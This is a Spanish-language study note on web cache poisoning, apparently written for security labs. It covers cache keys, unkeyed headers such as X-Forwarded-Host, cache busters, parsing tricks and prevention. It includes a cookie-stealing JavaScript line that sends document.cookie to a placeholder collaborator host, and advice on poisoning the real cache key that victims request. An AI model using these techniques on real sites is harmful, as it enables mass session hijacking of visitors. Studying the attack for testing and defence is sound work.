---
aliases:
  - Web Cache Poisoning
  - web-cache-poisoning-entrypoint
  - WCP
  - cache poisoning
tags:
  - vuln/web-cache-poisoning
  - entrypoint
---

# Web Cache Poisoning — Punto de entrada

> Documento **agnóstico al negocio**: *cómo **envenenar la caché** para que sirva mi payload a todos*.
> **Lab por lab** (clase · vector · recurso · efecto) → [[vulnerabilities/030-web-cache-poisoning/labs/README|labs/README]].

> [!abstract] La idea en una línea
> La caché guarda la respuesta indexada por una **cache key** (`método + host + path + [algunos headers]`). Si logro influir en la **respuesta** con un input que **NO forma parte de la key** (un header, cookie o param **"unkeyed"**), la copia envenenada queda cacheada y **el server se la sirve a TODO el que pida ese recurso**. Convierte un bug reflejado "solo para mí" en un **ataque almacenado y masivo**.

## 📚 Referencias rápidas

- 🧪 **Labs** — 13 (9 Practitioner + 4 Expert), con **clase · vector · recurso · efecto** → [[vulnerabilities/030-web-cache-poisoning/labs/README|labs/README]]
- 📎 **Ejemplos concretos** (request/response comentados) → carpeta `examples/`:
  - **Design flaws (headers):** [[vulnerabilities/030-web-cache-poisoning/examples/001-xfh-breakout-meta-tag|001 · XFH breakout en `<meta>`]] · [[vulnerabilities/030-web-cache-poisoning/examples/002-xfh-script-import|002 · XFH en `<script src>`]] · [[vulnerabilities/030-web-cache-poisoning/examples/003-multiples-headers|003 · Múltiples headers]] · [[vulnerabilities/030-web-cache-poisoning/examples/004-host-header-injection-redirect|004 · Host en el redirect]] · [[vulnerabilities/030-web-cache-poisoning/examples/006-unkeyed-port|006 · Unkeyed port]]
  - **Recon:** [[vulnerabilities/030-web-cache-poisoning/examples/005-ver-cache-key-akamai|005 · Ver la cache key (Akamai/`x-get-cache-key`)]]
  - **Implementation flaws (parseo):** [[vulnerabilities/030-web-cache-poisoning/examples/007-unkeyed-query-string-cachebuster|007 · Query string unkeyed + cache buster]] · [[vulnerabilities/030-web-cache-poisoning/examples/008-unkeyed-query-parameter|008 · Parámetro unkeyed (`utm_content`)]] · [[vulnerabilities/030-web-cache-poisoning/examples/009-parameter-cloaking|009 · Parameter cloaking]] · [[vulnerabilities/030-web-cache-poisoning/examples/010-fat-get|010 · Fat GET]] · [[vulnerabilities/030-web-cache-poisoning/examples/011-dynamic-resource-imports-css|011 · Imports dinámicos (CSS `@import`)]]
- 🛠️ **Herramienta clave** — **Param Miner** (*Guess headers* / *Guess GET/POST params*) para descubrir el input **unkeyed**.
- 🔗 **Vecinos** — el header rey es `X-Forwarded-Host` → se solapa con [[vulnerabilities/016-host-header-injection/conn_reuse.py|Host header attacks]]. El impacto final suele ser [[vulnerabilities/002-xss/README|XSS]].

## 🎯 Qué se logra (y qué NO)

- **Ejecutar JS en el browser de CADA visitante** — incluido el **admin** cuando pasa por la home. Los labs lo demuestran con `alert(document.cookie)` / `alert(1)`.
- Es **XSS entregado a escala**: robás la **cookie de sesión** de quien visite → **entrás a su cuenta** (session hijack). Sirve para robar la sesión de una víctima **o del admin**.
- ⚠️ **NO escala privilegios por sí solo** — no toca roles ni permisos; es compromiso **client-side masivo**. La escalada sale de *a quién* le robás la sesión.

## 🧩 Qué recurso contamina

El vehículo **siempre es ejecución de JS** (nunca CSS/imagen como fin). Lo que queda cacheado envenenado suele ser:

- **La página HTML** (la home) → forzada a **importar/ejecutar JS** (el caso más común: un header reflejado en un `<script src>`).
- **Un archivo JS** directo (pisás el `callback` o el `src` del import).
- **Un JSON** que consume el JS del cliente → dispara un **sink DOM**.
- **Una página 404** con el path reflejado (reflected XSS entregado por un link).

## 🧪 Metodología

1. **¿Hay caché? (cache oracle)** — buscá los **headers típicos** en la respuesta (🚩 FLAG que anotás en los STAGE):
   - `X-Cache: hit` / `miss` (y `X-Cache-Hits`, `Cache-Status`, `Age`) → indican si la respuesta vino de caché.
   - `Cache-Control` (`public`, `max-age`), `Vary`, `Expires`, `Pragma` → dicen **qué** y **cuánto** se cachea.
   - Un `.js`/página con `X-Cache` que alterna `miss`→`hit` = hay algo que envenenar.
2. **Mirá la cache key (si podés)** — en **Akamai**, `Pragma: akamai-x-get-cache-key` devuelve `X-Cache-Key`; genérico `Pragma: x-get-cache-key`. Te dice **exactamente qué es keyed vs unkeyed** → [[vulnerabilities/030-web-cache-poisoning/examples/005-ver-cache-key-akamai|005]].
3. **Encontrá el input unkeyed** — **Param Miner → Guess headers/params**. Mandá un valor único; si **se refleja** en la respuesta y **NO cambia el cache key** (mismo `hit`), es candidato. `X-Forwarded-Host`, `X-Forwarded-Scheme`/`-Proto`, `X-Host`, el **puerto** del `Host`, cookies, params `utm_*`.
4. **Encontrá el gadget** — ¿dónde cae ese input en la respuesta? Un `<script src>` / import (→ apuntalo a tu server), un string/atributo (→ breakout), un `@import` de CSS, un JSON que lee el cliente (→ DOM), un `Location`, el path de un 404 (→ reflected).
5. **Armá el payload y cacheá** — durante la prueba usá un **cache buster** (ver abajo) para no afectar a nadie; cuando funcione, **quitá el buster** para envenenar la key real que piden las víctimas.
6. **Confirmá el hit** — reenviá la request "limpia" y verificá que vuelve tu respuesta envenenada (`X-Cache: hit`).

### 🧨 El cache buster (probar sin esperar ni ensuciar)
Si el input es unkeyed, cambiarlo **no genera una entrada nueva** → el caché te da la copia vieja. Necesitás algo que **sí** cambie la key para testear fresco (detalle → [[vulnerabilities/030-web-cache-poisoning/examples/007-unkeyed-query-string-cachebuster|007]]):
- **Headers keyed inofensivos:** `Accept-Encoding: gzip, deflate, cachebuster` · `Accept: */*, text/cachebuster` · `Cookie: cachebuster=1` · `Origin: https://cachebuster.vulnerable-website.com`.
- **Param Miner:** opciones *Add static/dynamic cache buster* e *Include cache busters in headers*.
- ⚠️ El buster es **para vos**; al atacar hay que **quitarlo** para pegarle a la key real.

### 🔀 Discrepancias caché vs backend (parseo)
Cuando el caché y el origen **interpretan distinto** la misma request, colás el payload sin que entre en la key:
- **Path** (sirve de buster y de entrega): Apache `GET //` · Nginx `GET /%2F` · PHP `GET /index.php/xyz` · .NET `GET /(A(xyz)/`.
- **Parámetros** — *parameter cloaking*: esconder un param detrás de uno excluido con `;`/`?` → [[vulnerabilities/030-web-cache-poisoning/examples/009-parameter-cloaking|009]].
- **Método/cuerpo** — *fat GET*: la key mira la URL, el backend lee el body → [[vulnerabilities/030-web-cache-poisoning/examples/010-fat-get|010]].

### 🔧 Normalized cache keys
El caché suele **normalizar** la request antes de armar la key (URL-decode, resolver `/../`, minúsculas…). Si **normaliza distinto que el origen**, un payload **URL-encodeado en el path** puede quedar cacheado bajo la key "limpia" que la **víctima pide normalmente** → así entregás un **reflected XSS** por caché sin que la víctima mande nada raro (lab **URL normalization** → [[vulnerabilities/030-web-cache-poisoning/labs/README|labs]]).

## 📜 El script que ejecutás

Hosteás en tu **exploit server** el JS que la página envenenada va a importar, en el **path exacto** que referencia:
- Solve de lab: `alert(document.cookie)`.
- Real (exfil): `new Image().src='//TU-collab/?c='+document.cookie;` → capturás la cookie → la pegás → entrás a la cuenta.

## 🛡️ Prevención

- **No cachear** respuestas que dependen de inputs no confiables; si se cachea, que **todo input que afecte la respuesta forme parte de la cache key**.
- **No reflejar headers** (`X-Forwarded-Host`, etc.) en la respuesta; hostname público desde **config**, no desde headers del cliente.
- Cuidar **discrepancias de parseo/normalización** entre caché y origen (query, `;`, URL-decode).
- `Vary` correcto; deshabilitar features de caché innecesarias.

---

> [!tip] Reglas mentales
> - **Unkeyed = oro:** un input que se refleja pero no cambia el `X-Cache` → candidato a envenenar.
> - **`X-Forwarded-Host` es el rey:** casi todo nace de reflejarlo en un `<script src>`/import.
> - **Cache oracle primero:** `X-Cache`/`Age` te dicen si hay caché y si pegaste el hit.
> - **Cache buster al probar, quitalo al atacar:** no ensucies la key real hasta tener el payload listo.
> - **Impacto = a quién le pega:** mismo XSS, pero si el que visita es el admin, le robás su sesión.

> [!note] Relación con otras vulns
> - **Host header attacks** — el `X-Forwarded-Host` reflejado es el puente → carpeta `vulnerabilities/016-host-header-injection/`.
> - **XSS** — WCP es el **canal de entrega**; el payload es XSS → carpeta `vulnerabilities/002-xss/`.
> - **DOM-based** — varios labs contaminan un JSON que cae en un **sink DOM** → carpeta `vulnerabilities/025-dom-based/`.
> - **Request smuggling** — otra forma de envenenar caché / entregar a la próxima víctima → carpeta `vulnerabilities/008-http_smuggling/`.
